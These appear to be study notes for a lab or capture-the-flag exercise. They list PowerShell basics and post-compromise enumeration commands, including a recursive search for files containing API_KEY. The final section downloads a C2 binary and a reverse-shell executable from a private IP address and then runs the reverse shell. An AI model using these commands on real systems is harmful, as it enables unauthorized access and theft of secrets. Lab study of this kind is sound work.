
# PS, PowerShell
- The normal format of a cmdlet is represented using Verb-Noun;

Basic
- Get-Command
- Get-Help Command-Name
- Get-Command New-*
- Get-Command | Get-Member -MemberType Method
- Get-ChildItem | Select-Object -Property Mode, Name
- Get-Service | Where-Object -Property Status -eq Stopped

Sample
- Get-ChildItem -Path c:\ -Recurse *interesting-file.txt* -ErrorAction SilentlyContinue
- Get-Content 'C:\Program Files\interesting-file.txt.txt'


# Enumeration
- The first step when you have gained initial access to any machine would be to enumerate
    - Get-LocalUser                                                                         users
    - Get-NetIPAddress                                                                      Get IP address info
    - Get-NetTCPconnection -State Listen                                                    Listening port
    - Get-NetTCPconnection -State Listen -LocalPort 445                                     Remote address for Port 445
    - Get-hotfix | measure                                                                  Number of installed patch                                 
    - Get-ChildItem -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue                                         
    - Get-ChildItem C:\* -recurse | Select-String -pattern API_KEY                          Search for all files containing API_KEY
    - Get-Process                                                                           list all the running processes?
    - Get-Scheduledtask -TaskName new-sched-task
    - Get-Acl C:\

# Basic Scripting Challenge 


Get-ChildItem -Path c:\ -Recurse *user.txt* -ErrorAction SilentlyContinue
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.56.2/c2.exe','c2.exe')"
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.56.2/revshell9001exit.exe','revshell9001exit.exe')"

Start-Process "revshell9001exit.exe"